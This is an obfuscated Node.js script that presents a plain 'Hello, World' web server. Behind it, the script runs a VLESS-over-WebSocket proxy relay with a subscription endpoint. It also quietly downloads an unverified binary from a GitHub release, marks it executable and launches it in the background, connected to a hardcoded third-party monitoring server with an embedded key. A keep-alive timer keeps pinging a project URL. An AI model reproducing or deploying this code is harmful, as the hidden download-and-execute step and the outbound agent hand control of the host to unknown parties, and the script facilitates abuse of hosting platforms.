const _0x51e77c=_0x4cf7;(function(_0x3b07eb,_0x55f9c2){const _0x5cf804=_0x4cf7,_0xb3db84=_0x3b07eb();while(!![]){try{const _0x4cafa=-parseInt(_0x5cf804(0x1a5))/0x1*(-parseInt(_0x5cf804(0x1d0))/0x2)+parseInt(_0x5cf804(0x199))/0x3+-parseInt(_0x5cf804(0x1c3))/0x4*(-parseInt(_0x5cf804(0x17d))/0x5)+-parseInt(_0x5cf804(0x1c6))/0x6+parseInt(_0x5cf804(0x1b2))/0x7+-parseInt(_0x5cf804(0x1c2))/0x8+-parseInt(_0x5cf804(0x185))/0x9;if(_0x4cafa===_0x55f9c2)break;else _0xb3db84['push'](_0xb3db84['shift']());}catch(_0xccdd0d){_0xb3db84['push'](_0xb3db84['shift']());}}}(_0x3053,0x35477));const os=require('os'),http=require(_0x51e77c(0x191)),{Buffer}=require('buffer'),fs=require('fs'),axios=require('axios'),path=require('path'),net=require(_0x51e77c(0x182)),{exec,execSync}=require(_0x51e77c(0x1bf)),{WebSocket,createWebSocketStream}=require('ws'),logcb=(..._0x29c0b3)=>console['log']['bind'](this,..._0x29c0b3),errcb=(..._0x14c104)=>console['error'][_0x51e77c(0x1a1)](this,..._0x14c104),UUID=process['env']['UUID']||_0x51e77c(0x18d),uuid=UUID[_0x51e77c(0x1d2)](/-/g,''),projectPageURL=process[_0x51e77c(0x1b3)][_0x51e77c(0x1bb)]||'',intervalInMilliseconds=process[_0x51e77c(0x1b3)][_0x51e77c(0x193)]||0x1*0x3c*0x3e8,NEZHA_SERVER=process[_0x51e77c(0x1b3)][_0x51e77c(0x18f)]||_0x51e77c(0x1b4),NEZHA_PORT=process['env'][_0x51e77c(0x1b5)]||_0x51e77c(0x190),NEZHA_KEY=process['env'][_0x51e77c(0x1cb)]||'Back4app',DOMAIN=process[_0x51e77c(0x1b3)]['DOMAIN']||_0x51e77c(0x1bd),NAME=process[_0x51e77c(0x1b3)][_0x51e77c(0x19f)]||_0x51e77c(0x17e),port=process['env'][_0x51e77c(0x180)]||0xbb8,metaInfo=execSync(_0x51e77c(0x1aa),{'encoding':_0x51e77c(0x187)}),ISP=metaInfo[_0x51e77c(0x1ba)](),httpServer=http[_0x51e77c(0x19b)]((_0x80e923,_0x292f66)=>{const _0x23c1c7=_0x51e77c;if(_0x80e923['url']==='/')_0x292f66[_0x23c1c7(0x18c)](0xc8,{'Content-Type':'text/plain'}),_0x292f66[_0x23c1c7(0x1cc)](_0x23c1c7(0x1c7));else{if(_0x80e923[_0x23c1c7(0x17f)]==='/sub'){const _0x25fba2='vless://'+UUID+_0x23c1c7(0x1d4)+DOMAIN+_0x23c1c7(0x19e)+DOMAIN+_0x23c1c7(0x1a3)+NAME+'-'+ISP,_0x3f5647=Buffer[_0x23c1c7(0x194)](_0x25fba2)['toString'](_0x23c1c7(0x1ad));_0x292f66['writeHead'](0xc8,{'Content-Type':_0x23c1c7(0x19d)}),_0x292f66[_0x23c1c7(0x1cc)](_0x3f5647+'\x0a');}else _0x292f66[_0x23c1c7(0x18c)](0x194,{'Content-Type':_0x23c1c7(0x19d)}),_0x292f66[_0x23c1c7(0x1cc)](_0x23c1c7(0x1a8));}});httpServer[_0x51e77c(0x19a)](port,()=>{const _0x4a3855=_0x51e77c;console[_0x4a3855(0x183)](_0x4a3855(0x186)+port);});function getSystemArchitecture(){const _0x10c5b9=_0x51e77c,_0x2a1ce3=os[_0x10c5b9(0x1ca)]();return _0x2a1ce3===_0x10c5b9(0x1a0)||_0x2a1ce3==='arm64'?_0x10c5b9(0x1a0):_0x10c5b9(0x1a7);}function _0x4cf7(_0x4ee6be,_0x123cb2){const _0x305323=_0x3053();return _0x4cf7=function(_0x4cf7e5,_0x487425){_0x4cf7e5=_0x4cf7e5-0x17c;let _0x181fdc=_0x305323[_0x4cf7e5];return _0x181fdc;},_0x4cf7(_0x4ee6be,_0x123cb2);}function downloadFile(_0x1cb53f,_0x16dcd2,_0xd0bbf7){const _0x55bd61=_0x51e77c,_0xd28d6c=path[_0x55bd61(0x1bc)]('./',_0x1cb53f),_0x2d14f0=fs[_0x55bd61(0x1d1)](_0xd28d6c);axios({'method':_0x55bd61(0x1b0),'url':_0x16dcd2,'responseType':'stream'})['then'](_0x1faaa2=>{const _0x441ab2=_0x55bd61;_0x1faaa2[_0x441ab2(0x18a)][_0x441ab2(0x1c1)](_0x2d14f0),_0x2d14f0['on'](_0x441ab2(0x1a6),function(){const _0x365c9d=_0x441ab2;_0x2d14f0[_0x365c9d(0x1d6)](),_0xd0bbf7(null,_0x1cb53f);});})[_0x55bd61(0x188)](_0x58f238=>{const _0x481256=_0x55bd61;_0xd0bbf7(_0x481256(0x1d5)+_0x1cb53f+_0x481256(0x184)+_0x58f238[_0x481256(0x181)]);});}function _0x3053(){const _0x55b056=['arch','NEZHA_KEY','end','once','--tls','./swith','820014zfFKjs','createWriteStream','replace','\x20>/dev/null\x202>&1\x20&','@skk.moe:443?encryption=none&security=tls&sni=','Download\x20','close','decode','5YRivOX','Back4app','url','PORT','message','net','log','\x20failed:\x20','2238534ivxJub','HTTP\x20Server\x20is\x20running\x20on\x20port\x20','utf-8','catch','map','data','Empowerment\x20success:','writeHead','de04add9-5c68-6bab-950c-08cd5320df33','write','NEZHA_SERVER','443','http','./swith\x20-s\x20','TIME','from','connection','fileUrl','error','fileName','1226514FkIsFx','listen','createServer','toString','text/plain','&type=ws&host=','NAME','arm','bind','readUInt8','&path=%2F#','swith','1QBQCFi','finish','amd','Not\x20Found\x0a','URL\x20or\x20TIME\x20variable\x20is\x20empty.\x20Skipping\x20visit\x20URL','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','connect','https://github.com/eoovve/test/releases/download/bulid/swith','base64','length','reduce','get','slice','318850RRvElU','env','nezha.zumba.eu.org','NEZHA_PORT','E1:','chmod','Server','Empowerment\x20failed:','trim','URL','join','443.smith.cloudns.ph','readUInt16BE','child_process','\x20failed','pipe','684168JEezWB','288436ghIdnB','WebSocket\x20Error:','Connect:','2304156liEduH','Hello,\x20World\x0a','swith\x20is\x20running','send'];_0x3053=function(){return _0x55b056;};return _0x3053();}function downloadFiles(){const _0x1ef35c=_0x51e77c,_0x313e1a=getSystemArchitecture(),_0x5107a4=getFilesForArchitecture(_0x313e1a);if(_0x5107a4[_0x1ef35c(0x1ae)]===0x0){console[_0x1ef35c(0x183)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}let _0x4dff93=0x0;_0x5107a4['forEach'](_0x53859c=>{const _0x4fa764=_0x1ef35c;downloadFile(_0x53859c[_0x4fa764(0x198)],_0x53859c[_0x4fa764(0x196)],(_0x38323f,_0x267d5b)=>{const _0x47926a=_0x4fa764;_0x38323f?console['log'](_0x47926a(0x1d5)+_0x267d5b+_0x47926a(0x1c0)):(console[_0x47926a(0x183)](_0x47926a(0x1d5)+_0x267d5b+'\x20successfully'),_0x4dff93++,_0x4dff93===_0x5107a4[_0x47926a(0x1ae)]&&setTimeout(()=>{authorizeFiles();},0xbb8));});});}function getFilesForArchitecture(_0x1e8daf){const _0x51d1bf=_0x51e77c;if(_0x1e8daf===_0x51d1bf(0x1a0))return[{'fileName':'swith','fileUrl':'https://github.com/eoovve/test/releases/download/ARM/swith'}];else{if(_0x1e8daf==='amd')return[{'fileName':_0x51d1bf(0x1a4),'fileUrl':_0x51d1bf(0x1ac)}];}return[];}function authorizeFiles(){const _0x12304d=_0x51e77c,_0x354ad7=_0x12304d(0x1cf),_0x150d75=0x1fd;fs[_0x12304d(0x1b7)](_0x354ad7,_0x150d75,_0x56dc51=>{const _0x546c6c=_0x12304d;if(_0x56dc51)console[_0x546c6c(0x197)](_0x546c6c(0x1b9)+_0x56dc51);else{console[_0x546c6c(0x183)](_0x546c6c(0x18b)+_0x150d75[_0x546c6c(0x19c)](0x8)+'\x20('+_0x150d75['toString'](0xa)+')');let _0x1cb775='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){NEZHA_PORT===_0x546c6c(0x190)?_0x1cb775=_0x546c6c(0x1ce):_0x1cb775='';const _0x142f12=_0x546c6c(0x192)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x1cb775+_0x546c6c(0x1d3);try{exec(_0x142f12),console[_0x546c6c(0x183)](_0x546c6c(0x1c8));}catch(_0x4872f8){console[_0x546c6c(0x197)]('swith\x20running\x20error:\x20'+_0x4872f8);}}else console[_0x546c6c(0x183)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');}});}downloadFiles();const wss=new WebSocket[(_0x51e77c(0x1b8))]({'server':httpServer});wss['on'](_0x51e77c(0x195),_0x1eca64=>{const _0x18fc36=_0x51e77c;console['log']('Connected\x20successfully'),_0x1eca64[_0x18fc36(0x1cd)](_0x18fc36(0x181),_0x52b7d7=>{const _0x3d6c20=_0x18fc36,[_0x355526]=_0x52b7d7,_0x24afb2=_0x52b7d7[_0x3d6c20(0x1b1)](0x1,0x11);if(!_0x24afb2['every']((_0x16c7e9,_0x47f09b)=>_0x16c7e9==parseInt(uuid['substr'](_0x47f09b*0x2,0x2),0x10)))return;let _0x319b27=_0x52b7d7[_0x3d6c20(0x1b1)](0x11,0x12)['readUInt8']()+0x13;const _0xb0c13d=_0x52b7d7[_0x3d6c20(0x1b1)](_0x319b27,_0x319b27+=0x2)['readUInt16BE'](0x0),_0xa32c02=_0x52b7d7[_0x3d6c20(0x1b1)](_0x319b27,_0x319b27+=0x1)[_0x3d6c20(0x1a2)](),_0x47e334=_0xa32c02==0x1?_0x52b7d7[_0x3d6c20(0x1b1)](_0x319b27,_0x319b27+=0x4)[_0x3d6c20(0x1bc)]('.'):_0xa32c02==0x2?new TextDecoder()[_0x3d6c20(0x17c)](_0x52b7d7[_0x3d6c20(0x1b1)](_0x319b27+0x1,_0x319b27+=0x1+_0x52b7d7[_0x3d6c20(0x1b1)](_0x319b27,_0x319b27+0x1)[_0x3d6c20(0x1a2)]())):_0xa32c02==0x3?_0x52b7d7['slice'](_0x319b27,_0x319b27+=0x10)[_0x3d6c20(0x1af)]((_0x14ca49,_0x19e50c,_0x4534d7,_0x4b612e)=>_0x4534d7%0x2?_0x14ca49['concat'](_0x4b612e['slice'](_0x4534d7-0x1,_0x4534d7+0x1)):_0x14ca49,[])[_0x3d6c20(0x189)](_0x1a040a=>_0x1a040a[_0x3d6c20(0x1be)](0x0)[_0x3d6c20(0x19c)](0x10))[_0x3d6c20(0x1bc)](':'):'';logcb(_0x3d6c20(0x1c5),_0x47e334,_0xb0c13d),_0x1eca64[_0x3d6c20(0x1c9)](new Uint8Array([_0x355526,0x0]));const _0x3f484c=createWebSocketStream(_0x1eca64);net[_0x3d6c20(0x1ab)]({'host':_0x47e334,'port':_0xb0c13d},function(){const _0x574bec=_0x3d6c20;this[_0x574bec(0x18e)](_0x52b7d7['slice'](_0x319b27)),_0x3f484c['on'](_0x574bec(0x197),errcb(_0x574bec(0x1b6)))[_0x574bec(0x1c1)](this)['on'](_0x574bec(0x197),errcb('E2:'))[_0x574bec(0x1c1)](_0x3f484c);})['on'](_0x3d6c20(0x197),errcb('Connect-Err:',{'host':_0x47e334,'port':_0xb0c13d}));})['on']('error',errcb(_0x18fc36(0x1c4)));});let hasLoggedEmptyMessage=![];async function visitProjectPage(){const _0xd58dc=_0x51e77c;try{if(!projectPageURL||!intervalInMilliseconds){!hasLoggedEmptyMessage&&(console[_0xd58dc(0x183)](_0xd58dc(0x1a9)),hasLoggedEmptyMessage=!![]);return;}else hasLoggedEmptyMessage=![];await axios[_0xd58dc(0x1b0)](projectPageURL),console[_0xd58dc(0x183)]('Page\x20visited\x20successfully.');}catch(_0x5786fc){console[_0xd58dc(0x197)]('Error\x20visiting\x20project\x20page:',_0x5786fc['message']);}}setInterval(visitProjectPage,intervalInMilliseconds);
